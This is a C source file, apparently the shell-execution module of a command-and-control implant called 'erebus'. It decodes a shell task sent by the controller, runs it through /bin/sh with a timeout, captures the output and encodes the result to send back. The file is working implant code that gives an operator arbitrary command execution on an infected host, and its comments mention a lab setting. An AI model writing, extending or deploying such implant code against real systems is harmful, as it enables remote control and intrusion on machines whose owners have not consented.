#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "erebus/pb_c2.h"

#define MAX_CHUNK 4096
#define MAX_CAPTURE (1 << 20)
/* Match practical lab default; hang kills implant task, not the whole process. */
#define SHELL_TIMEOUT_SEC 120

static void set_nonblock(int fd) {
    int fl = fcntl(fd, F_GETFL, 0);
    if (fl >= 0) fcntl(fd, F_SETFL, fl | O_NONBLOCK);
}

static int drain_fd(int fd, char *buf, size_t *len, size_t cap) {
    char tmp[MAX_CHUNK];
    ssize_t n;
    int got = 0;
    while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
        got = 1;
        if (*len + (size_t)n < cap - 1) {
            memcpy(buf + *len, tmp, (size_t)n);
            *len += (size_t)n;
        }
    }
    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
        return -1;
    return got;
}

static int run_cmd(const char *command, char **stdout_out, char **stderr_out, int32_t *exit_code) {
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) != 0 || pipe(err_pipe) != 0) return 0;

    pid_t pid = fork();
    if (pid < 0) {
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return 0;
    }
    if (pid == 0) {
        close(out_pipe[0]);
        close(err_pipe[0]);
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[1]);
        close(err_pipe[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }
    close(out_pipe[1]);
    close(err_pipe[1]);
    set_nonblock(out_pipe[0]);
    set_nonblock(err_pipe[0]);

    char *out_buf = (char *)calloc(1, MAX_CAPTURE);
    char *err_buf = (char *)calloc(1, MAX_CAPTURE);
    if (!out_buf || !err_buf) {
        free(out_buf); free(err_buf);
        close(out_pipe[0]); close(err_pipe[0]);
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
        return 0;
    }
    size_t out_len = 0, err_len = 0;
    time_t deadline = time(NULL) + SHELL_TIMEOUT_SEC;
    int timed_out = 0;
    int child_done = 0;
    int status = 0;

    while (!child_done) {
        time_t now = time(NULL);
        if (now >= deadline) {
            timed_out = 1;
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            child_done = 1;
            break;
        }

        struct pollfd pfds[2];
        pfds[0].fd = out_pipe[0];
        pfds[0].events = POLLIN;
        pfds[1].fd = err_pipe[0];
        pfds[1].events = POLLIN;
        int pr = poll(pfds, 2, 200);
        if (pr > 0) {
            if (pfds[0].revents & (POLLIN | POLLHUP | POLLERR))
                drain_fd(out_pipe[0], out_buf, &out_len, MAX_CAPTURE);
            if (pfds[1].revents & (POLLIN | POLLHUP | POLLERR))
                drain_fd(err_pipe[0], err_buf, &err_len, MAX_CAPTURE);
        }

        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) {
            child_done = 1;
            /* drain remaining */
            drain_fd(out_pipe[0], out_buf, &out_len, MAX_CAPTURE);
            drain_fd(err_pipe[0], err_buf, &err_len, MAX_CAPTURE);
        }
    }

    close(out_pipe[0]);
    close(err_pipe[0]);

    if (timed_out) {
        const char *msg = "\n[erebus] shell timeout (120s), process killed\n";
        size_t mlen = strlen(msg);
        if (err_len + mlen < MAX_CAPTURE - 1) {
            memcpy(err_buf + err_len, msg, mlen);
            err_len += mlen;
        }
        *exit_code = 124; /* common timeout code */
    } else {
        *exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    }
    *stdout_out = out_buf;
    *stderr_out = err_buf;
    return 1;
}

int erebus_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_shell_task st;
    if (!erebus_pb_decode_shell_task(data, data_len, &st)) return 0;
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    if (!run_cmd(st.command, &so, &se, &code)) return 0;
    int ok = erebus_pb_encode_shell_result(so, se, code, out, out_len);
    free(so);
    free(se);
    return ok;
}
